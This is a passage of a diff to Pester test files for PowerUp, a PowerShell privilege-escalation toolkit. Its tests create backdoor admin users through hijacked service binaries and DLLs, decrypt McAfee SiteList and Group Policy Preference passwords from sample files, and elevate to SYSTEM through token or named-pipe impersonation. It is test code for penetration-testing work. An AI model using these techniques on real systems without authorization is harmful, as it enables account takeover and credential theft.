+            if( -not ($(net localgroup Administrators) -match 'PowerUp')) {
+                Throw "Local user 'PowerUp' not created."
+            }
+
+            $Output = Restore-ServiceBinary -ServiceName PowerUpService
+            "$(Get-Location)\powerup.exe.bak" | Should Not Exist
         }
-        $Null = $(net user PowerUp /delete >$Null 2>&1)
+        finally {
+            $Null = $(net user PowerUp /delete >$Null 2>&1)
+        }
+    }
+
+    It 'Should accept a credential object.' {
+        $Username = 'PowerUp123'
+        $Password = ConvertTo-SecureString 'PASSword123!' -AsPlaintext -Force 
+        $Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $Username, $Password
+
+        $Output = Install-ServiceBinary -ServiceName 'PowerUpService' -Credential $Credential
+        $Output.Command | Should Match 'net'
+
+        $Null = Start-Service -Name PowerUpService -ErrorAction SilentlyContinue
+        Start-Sleep -Seconds 3
+        if( -not ($(net localgroup Administrators) -match 'PowerUp123')) {
+            Throw "Local user 'PowerUp123' not created."
+        }
+        $Null = $(net user PowerUp123 /delete >$Null 2>&1)
 
         $Output = Restore-ServiceBinary -ServiceName PowerUpService
         "$(Get-Location)\powerup.exe.bak" | Should Not Exist
     }
 
-    It 'Should accept a custom command.' {
+    It 'Should accept an alternate LocalGroup.' {
+        try {
+            $Output = Install-ServiceBinary -ServiceName 'PowerUpService' -Username 'PowerUp' -Password 'PASSword123!' -LocalGroup 'Guests'
+            $Output.Command | Should Match 'net'
 
-        $Output = Install-ServiceBinary -ServiceName "PowerUpService" -Command "net user testing Password123! /add"
-        $Output.Command | Should Match "net"
+            $Null = Start-Service -Name PowerUpService -ErrorAction SilentlyContinue
+            Start-Sleep -Seconds 3
+            if( -not ($(net localgroup Guests) -match 'PowerUp')) {
+                Throw "Local user 'PowerUp' not created."
+            }
 
-        $Null = Invoke-ServiceStart -ServiceName PowerUpService
-        Start-Sleep -Seconds 3
-        if( -not ($(net user) -match "testing")) {
-            Throw "Custom command failed."
+            $Output = Restore-ServiceBinary -ServiceName PowerUpService
+            "$(Get-Location)\powerup.exe.bak" | Should Not Exist
         }
-        $Null = $(net user testing /delete >$Null 2>&1)
+        finally {
+            $Null = $(net user PowerUp /delete >$Null 2>&1)
+        }
+    }
 
-        $Output = Restore-ServiceBinary -ServiceName PowerUpService
-        "$(Get-Location)\powerup.exe.bak" | Should Not Exist
+    It 'Should accept a custom command.' {
+        try {
+            $Output = Install-ServiceBinary -ServiceName 'PowerUpService' -Command "net user testing Password123! /add"
+            $Output.Command | Should Match 'net'
+
+            $Null = Start-Service -Name PowerUpService -ErrorAction SilentlyContinue
+            Start-Sleep -Seconds 3
+            if( -not ($(net user) -match "testing")) {
+                Throw "Custom command failed."
+            }
+        
+            $Output = Restore-ServiceBinary -ServiceName PowerUpService
+            "$(Get-Location)\powerup.exe.bak" | Should Not Exist
+        }
+        finally {
+            $Null = $(net user testing /delete >$Null 2>&1)
+        }
     }
 }
 
@@ -378,46 +890,90 @@ Describe 'Install-ServiceBinary' {
 #
 ########################################################
 
-Describe 'Find-DLLHijack' {
+Describe 'Find-ProcessDLLHijack' {
     It 'Should return results.' {
-        $Output = Find-DLLHijack
+        $Output = Find-ProcessDLLHijack
         $Output | Should Not BeNullOrEmpty
+    }
+
+    It 'Should accept a Process name on the pipeline.' {
+        {'powershell' | Find-ProcessDLLHijack} | Should Not Throw
+    }
+
+    It 'Should accept a service object on the pipeline.' {
+        {Get-Process powershell | Find-ProcessDLLHijack} | Should Not Throw
     }
 }
 
 
-Describe 'Find-PathHijack' {
+Describe 'Find-PathDLLHijack' {
 
     if(-not $(Test-IsAdmin)) { 
-        Throw "'Find-PathHijack' Pester test needs local administrator privileges."
+        Throw "'Find-PathDLLHijack' Pester test needs local administrator privileges."
     }
 
     It 'Should find a hijackable %PATH% folder.' {
 
-        New-Item -Path C:\PowerUpTest\ -ItemType directory -Force
+        New-Item -Path 'C:\PowerUpTest\' -ItemType directory -Force
 
-        try {
-            $OldPath = $Env:PATH
-            $Env:PATH += ';C:\PowerUpTest\'
+        $OldPath = $Env:PATH
+        $Env:PATH += ';C:\PowerUpTest\'
 
-            $Output = Find-PathHijack | Where-Object {$_.HijackablePath -like "*PowerUpTest*"}
+        $Output = Find-PathDLLHijack | Where-Object {$_.ModifiablePath -like "*PowerUpTest*"} | Select-Object -First 1
 
-            $Env:PATH = $OldPath
-            $Output.HijackablePath | Should Be 'C:\PowerUpTest\'
+        $Env:PATH = $OldPath
+
+        $Output.ModifiablePath | Should Be 'C:\PowerUpTest\'
+
+        if ($Output.PSObject.Properties.Name -notcontains '%PATH%') {
+            Throw "Find-PathDLLHijack result doesn't contain '%PATH%' field."
         }
-        catch {
-            $Null = Remove-Item -Recurse -Force 'C:\PowerUpTest\' -ErrorAction SilentlyContinue
+        if ($Output.PSObject.Properties.Name -notcontains 'ModifiablePath') {
+            Throw "Find-PathDLLHijack result doesn't contain 'ModifiablePath' field."
+        }
+        if ($Output.PSObject.Properties.Name -notcontains 'Permissions') {
+            Throw "Find-PathDLLHijack result doesn't contain 'Permissions' field."
+        }
+        if ($Output.PSObject.Properties.Name -notcontains 'IdentityReference') {
+            Throw "Find-PathDLLHijack result doesn't contain 'IdentityReference' field."
+        }
+
+        $Null = Remove-Item -Recurse -Force 'C:\PowerUpTest\' -ErrorAction SilentlyContinue
+    }
+
+    It "Should find a hijackable %PATH% folder that doesn't yet exist." {
+
+        $OldPath = $Env:PATH
+        $Env:PATH += ';C:\PowerUpTest\'
+
+        $Output = Find-PathDLLHijack | Where-Object {$_.'%PATH%' -eq 'C:\PowerUpTest\'} | Select-Object -First 1
+
+        $Env:PATH = $OldPath
+
+        $Output.ModifiablePath | Should Be 'C:\'
+
+        if ($Output.PSObject.Properties.Name -notcontains '%PATH%') {
+            Throw "Find-PathDLLHijack result doesn't contain 'ModifiablePath' field."
+        }
+        if ($Output.PSObject.Properties.Name -notcontains 'ModifiablePath') {
+            Throw "Find-PathDLLHijack result doesn't contain 'ModifiablePath' field."
+        }
+        if ($Output.PSObject.Properties.Name -notcontains 'Permissions') {
+            Throw "Find-PathDLLHijack result doesn't contain 'Permissions' field."
+        }
+        if ($Output.PSObject.Properties.Name -notcontains 'IdentityReference') {
+            Throw "Find-PathDLLHijack result doesn't contain 'IdentityReference' field."
         }
     }
 }
 
-# won't actually execute on Win8+ with the wlbsctrl.dll method
+
 Describe 'Write-HijackDll' {
-
+    # won't actually execute on Win8+ with the wlbsctrl.dll method
+    # TODO: write tests to properly cover parameter validation
     It 'Should write a .dll that executes a custom command.' {
-
         try {
-            Write-HijackDll -OutputFile "$(Get-Location)\powerup.dll" -Command "net user testing Password123! /add"
+            Write-HijackDll -DllPath "$(Get-Location)\powerup.dll" -Command 'net user testing Password123! /add'
             
             "$(Get-Location)\powerup.dll" | Should Exist
             "$(Get-Location)\debug.bat" | Should Exist
@@ -436,45 +992,68 @@ Describe 'Write-HijackDll' {
 #
 ########################################################
 
-Describe 'Get-RegAlwaysInstallElevated' {
+Describe 'Get-RegistryAlwaysInstallElevated' {
+    # TODO: set registry key, ensure it retrieves
     It 'Should not throw.' {
-        {Get-ServicePermission} | Should Not Throw
+        {Get-RegistryAlwaysInstallElevated} | Should Not Throw
     }
 }
 
 
-Describe 'Get-RegAutoLogon' {
+Describe 'Get-RegistryAutoLogon' {
+    # TODO: set a vulnerable autorun credential, ensure it retrieves
     It 'Should not throw.' {
-        {Get-ServicePermission} | Should Not Throw
+        {Get-RegistryAutoLogon} | Should Not Throw
     }
 }
 
 
-Describe 'Get-VulnAutoRun' {
+Describe 'Get-ModifiableRegistryAutoRun' {
 
     if(-not $(Test-IsAdmin)) { 
-        Throw "'Get-VulnAutoRun' Pester test needs local administrator privileges."
+        Throw "'Get-ModifiableRegistryAutoRun' Pester test needs local administrator privileges."
     }
 
     It 'Should not throw.' {
-        {Get-VulnAutoRun} | Should Not Throw
+        {Get-ModifiableRegistryAutoRun} | Should Not Throw
     }
+
     It 'Should find a vulnerable autorun.' {
         try {
             $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
             $Null | Out-File -FilePath $FilePath -Force
             $Null = Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name PowerUp -Value "vuln.exe -i '$FilePath'"
 
-            $Output = Get-VulnAutoRun | ?{$_.Path -like "*$FilePath*"}
+            $Output = Get-ModifiableRegistryAutoRun | Where-Object {$_.ModifiableFile -like "*$FilePath*"} | Select-Object -First 1
+
+            $Output.ModifiableFile.ModifiablePath | Should Be $FilePath
+
+            if ($Output.PSObject.Properties.Name -notcontains 'Key') {
+                Throw "Get-ModifiableRegistryAutoRun result doesn't contain 'Key' field."
+            }
+            if ($Output.PSObject.Properties.Name -notcontains 'Path') {
+                Throw "Get-ModifiableRegistryAutoRun result doesn't contain 'Path' field."
+            }
+            if ($Output.PSObject.Properties.Name -notcontains 'ModifiableFile') {
+                Throw "Get-ModifiableRegistryAutoRun result doesn't contain 'ModifiableFile' field."
+            }
+
+            if ($Output.ModifiableFile.PSObject.Properties.Name -notcontains 'ModifiablePath') {
+                Throw "Get-ModifiableRegistryAutoRun ModifiableFile result doesn't contain 'ModifiablePath' field."
+            }
+            if ($Output.ModifiableFile.PSObject.Properties.Name -notcontains 'Permissions') {
+                Throw "Get-ModifiableRegistryAutoRun ModifiableFile result doesn't contain 'Permissions' field."
+            }
+            if ($Output.ModifiableFile.PSObject.Properties.Name -notcontains 'IdentityReference') {
+                Throw "Get-ModifiableRegistryAutoRun ModifiableFile result doesn't contain 'IdentityReference' field."
+            }
 
             $Null = Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run' -Name PowerUp
-            
-            $Output.ModifiableFile | Should Be $FilePath
         }
         finally {
             $Null = Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
         }
-    }    
+    }
 }
 
 
@@ -484,28 +1063,47 @@ Describe 'Get-VulnAutoRun' {
 #
 ########################################################
 
-Describe 'Get-VulnSchTask' {
+Describe 'Get-ModifiableScheduledTaskFile' {
 
     if(-not $(Test-IsAdmin)) { 
-        Throw "'Get-VulnSchTask' Pester test needs local administrator privileges."
+        Throw "'Get-ModifiableScheduledTaskFile' Pester test needs local administrator privileges."
     }
 
     It 'Should not throw.' {
-        {Get-VulnSchTask} | Should Not Throw
+        {Get-ModifiableScheduledTaskFile} | Should Not Throw
     }
 
     It 'Should find a vulnerable config file for a binary specified in a schtask.' {
-
         try {
             $FilePath = "$(Get-Location)\$([IO.Path]::GetRandomFileName())"
             $Null | Out-File -FilePath $FilePath -Force
 
             $Null = schtasks.exe /create /tn PowerUp /tr "vuln.exe -i '$FilePath'" /sc onstart /ru System /f
 
-            $Output = Get-VulnSchTask | Where-Object {$_.TaskName -eq 'PowerUp'}
+            $Output = Get-ModifiableScheduledTaskFile | Where-Object {$_.TaskName -eq 'PowerUp'} | Select-Object -First 1
             $Null = schtasks.exe /delete /tn PowerUp /f
-            
-            $Output.TaskFilePath | Should Be $FilePath
+
+            $Output.TaskFilePath.ModifiablePath | Should Be $FilePath
+
+            if ($Output.PSObject.Properties.Name -notcontains 'TaskName') {
+                Throw "Get-ModifiableScheduledTaskFile result doesn't contain 'TaskName' field."
+            }
+            if ($Output.PSObject.Properties.Name -notcontains 'TaskFilePath') {
+                Throw "Get-ModifiableScheduledTaskFile result doesn't contain 'TaskFilePath' field."
+            }
+            if ($Output.PSObject.Properties.Name -notcontains 'TaskTrigger') {
+                Throw "Get-ModifiableScheduledTaskFile result doesn't contain 'TaskTrigger' field."
+            }
+
+            if ($Output.TaskFilePath.PSObject.Properties.Name -notcontains 'ModifiablePath') {
+                Throw "Get-ModifiableScheduledTaskFile TaskFilePath result doesn't contain 'ModifiablePath' field."
+            }
+            if ($Output.TaskFilePath.PSObject.Properties.Name -notcontains 'Permissions') {
+                Throw "Get-ModifiableScheduledTaskFile TaskFilePath result doesn't contain 'Permissions' field."
+            }
+            if ($Output.TaskFilePath.PSObject.Properties.Name -notcontains 'IdentityReference') {
+                Throw "Get-ModifiableScheduledTaskFile TaskFilePath result doesn't contain 'IdentityReference' field."
+            }
         }
         finally {
             $Null = Remove-Item -Path $FilePath -Force -ErrorAction SilentlyContinue
@@ -552,6 +1150,118 @@ Describe 'Get-ApplicationHost' {
     }
 }
 
+Describe 'Get-SiteListPassword' {
+    BeforeEach {
+        $Xml = '<?xml version="1.0" encoding="UTF-8"?><ns:SiteLists xmlns:ns="naSiteList" Type="Client"><SiteList Default="1" Name="SomeGUID"><HttpSite Type="fallback" Name="McAfeeHttp" Order="26" Enabled="1" Local="0" Server="update.nai.com:80"><RelativePath>Products/CommonUpdater</RelativePath><UseAuth>0</UseAuth><UserName></UserName><Password Encrypted="1">jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==</Password></HttpSite><UNCSite Type="repository" Name="Paris" Order="13" Server="paris001" Enabled="1" Local="0"><ShareName>Repository$</ShareName><RelativePath></RelativePath><UseLoggedonUserAccount>0</UseLoggedonUserAccount><DomainName>companydomain</DomainName><UserName>McAfeeService</UserName><Password Encrypted="0">Password123!</Password></UNCSite><UNCSite Type="repository" Name="Tokyo" Order="18" Server="tokyo000" Enabled="1" Local="0"><ShareName>Repository$</ShareName><RelativePath></RelativePath><UseLoggedonUserAccount>0</UseLoggedonUserAccount><DomainName>companydomain</DomainName><UserName>McAfeeService</UserName><Password Encrypted="1">jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==</Password></UNCSite></SiteList></ns:SiteLists>'
+        $Xml | Out-File -FilePath "${Home}\SiteList.xml" -Force
+    }
+    AfterEach {
+        Remove-Item -Force "${Home}\SiteList.xml"
+    }
+
+    It 'Should correctly find and parse a SiteList.xml file.' {
+
+        $Credentials = Get-SiteListPassword
+        
+        $Credentials | Where-Object {$_.Name -eq 'McAfeeHttp'} | ForEach-Object {
+            # HTTP site
+            $_.Enabled | Should Be '1'
+            $_.Server | Should Be 'update.nai.com:80'
+            $_.Path | Should Be 'Products/CommonUpdater'
+            $_.EncPassword | Should Be 'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='
+            $_.DecPassword | Should Be 'MyStrongPassword!'
+            $_.UserName | Should BeNullOrEmpty
+            $_.DomainName | Should BeNullOrEmpty            
+        } 
+        
+        $Credentials | Where-Object {$_.Name -eq 'Paris'} | ForEach-Object {
+            # UNC site with unencrypted password
+            $_.Enabled | Should Be '1'
+            $_.Server | Should Be 'paris001'
+            $_.Path | Should Be 'Repository$'
+            $_.EncPassword | Should Be 'Password123!'
+            $_.DecPassword | Should Be 'Password123!'
+            $_.UserName | Should Be 'McAfeeService'
+            $_.DomainName | Should Be 'companydomain'
+        }
+
+        $Credentials | Where-Object {$_.Name -eq 'Tokyo'} | ForEach-Object {
+            # UNC site with encrypted password
+            $_.Enabled | Should Be '1'
+            $_.Server | Should Be 'tokyo000'
+            $_.Path | Should Be 'Repository$'
+            $_.EncPassword | Should Be 'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='
+            $_.DecPassword | Should Be 'MyStrongPassword!'
+            $_.UserName | Should Be 'McAfeeService'
+            $_.DomainName | Should Be 'companydomain'
+        }
+    }
+
+    It 'Should correctly parse a SiteList.xml on a specified path.' {
+        
+        $Credentials = Get-SiteListPassword -Path "${Home}\SiteList.xml"
+        
+        $Credentials | Where-Object {$_.Name -eq 'McAfeeHttp'} | ForEach-Object {
+            # HTTP site
+            $_.Enabled | Should Be '1'
+            $_.Server | Should Be 'update.nai.com:80'
+            $_.Path | Should Be 'Products/CommonUpdater'
+            $_.EncPassword | Should Be 'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='
+            $_.DecPassword | Should Be 'MyStrongPassword!'
+            $_.UserName | Should BeNullOrEmpty
+            $_.DomainName | Should BeNullOrEmpty            
+        } 
+
+        $Credentials | Where-Object {$_.Name -eq 'Paris'} | ForEach-Object {
+            # UNC site with unencrypted password
+            $_.Enabled | Should Be '1'
+            $_.Server | Should Be 'paris001'
+            $_.Path | Should Be 'Repository$'
+            $_.EncPassword | Should Be 'Password123!'
+            $_.DecPassword | Should Be 'Password123!'
+            $_.UserName | Should Be 'McAfeeService'
+            $_.DomainName | Should Be 'companydomain'
+        }
+
+        $Credentials | Where-Object {$_.Name -eq 'Tokyo'} | ForEach-Object {
+            # UNC site with encrypted password
+            $_.Enabled | Should Be '1'
+            $_.Server | Should Be 'tokyo000'
+            $_.Path | Should Be 'Repository$'
+            $_.EncPassword | Should Be 'jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q=='
+            $_.DecPassword | Should Be 'MyStrongPassword!'
+            $_.UserName | Should Be 'McAfeeService'
+            $_.DomainName | Should Be 'companydomain'
+        }
+    }
+}
+
+
+Describe 'Get-CachedGPPPassword' {
+
+    if(-not $(Test-IsAdmin)) { 
+        Throw "'Get-CachedGPPPassword' Pester test needs local administrator privileges."
+    }
+
+    # all referenced GPP .xml sources from https://github.com/rapid7/metasploit-framework/blob/master/spec/lib/rex/parser/group_policy_preferences_spec.rb
+    It 'Should throw if no files are found.' {
+        Get-CachedGPPPassword | Should Throw
+    }
+
+    It 'Should correctly find and parse a cached Groups.xml file.' {
+        $Path = "${Env:ALLUSERSPROFILE}\Microsoft\Group Policy\History\{23C4E89F-7D3A-4237-A61D-8EF82B5B9E42}\Machine\Preferences\Groups\Groups.xml"
+        $Null = New-Item -ItemType File -Path $Path -Force
+        $GroupsXml = '<?xml version="1.0" encoding="utf-8"?><Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="SuperSecretBackdoor" image="0" changed="2013-04-25 18:36:07" uid="{B5EDB865-34F5-4BD7-9C59-3AEB1C7A68C3}"><Properties action="C" fullName="" description="" cpassword="VBQUNbDhuVti3/GHTGHPvcno2vH3y8e8m1qALVO1H3T0rdkr2rub1smfTtqRBRI3" changeLogon="0" noChange="0" neverExpires="1" acctDisabled="0" userName="SuperSecretBackdoor"/></User></Groups>'
+        $GroupsXml | Out-File -FilePath $Path -Force
+
+        $GPPResult = Get-CachedGPPPassword
+        Remove-Item -Force $Path
+
+        $GPPResult.Passwords[0] | Should be 'Super!!!Password'
+        $GPPResult.UserNames[0] | Should be 'SuperSecretBackdoor'
+    }
+}
+
 
 Describe 'Invoke-AllChecks' {
     It 'Should return results to stdout.' {
@@ -566,5 +1276,47 @@ Describe 'Invoke-AllChecks' {
 
         $HtmlReportFile | Should Exist
         $Null = Remove-Item -Path $HtmlReportFile -Force -ErrorAction SilentlyContinue
+    }
+}
+
+
+Describe 'Get-System' {
+
+    if(-not $(Test-IsAdmin)) { 
+        Throw "'Get-System' Pester test needs local administrator privileges."
+    }
+
+    AfterEach {
+        Get-System -RevToSelf
+    }
+
+    It 'Should not throw with default parameters and should elevate to SYSTEM.' {
+        { Get-System } | Should Not Throw
+        "$([Environment]::UserName)" | Should Be 'SYSTEM'
+    }
+
+    It 'Named pipe impersonation should accept an alternate service and pipe name.' {
+        { Get-System -Technique NamedPipe -ServiceName 'testing123' -PipeName 'testpipe' } | Should Not Throw
+        "$([Environment]::UserName)" | Should Be 'SYSTEM'
+    }
+
+    It 'Should elevate to SYSTEM using token impersonation.' {
+        { Get-System -Technique Token } | Should Not Throw
+        "$([Environment]::UserName)" | Should Be 'SYSTEM'
+    }
+
+    It '-WhoAmI should display the current user.' {
+        { Get-System -Technique Token } | Should Not Throw
+        { Get-System -WhoAmI } | Should Match 'SYSTEM'
+    }
+
+    It 'RevToSelf should revert privileges.' {
+        { Get-System -Technique Token } | Should Not Throw
+        { Get-System -RevToSelf } | Should Not Throw
+        "$([Environment]::UserName)" | Should Not Match 'SYSTEM'
+    }
+
+    It 'Token impersonation should throw with incompatible parameters.' {
+        { Get-System -Technique Token -WhoAmI } | Should Throw
     }
 }
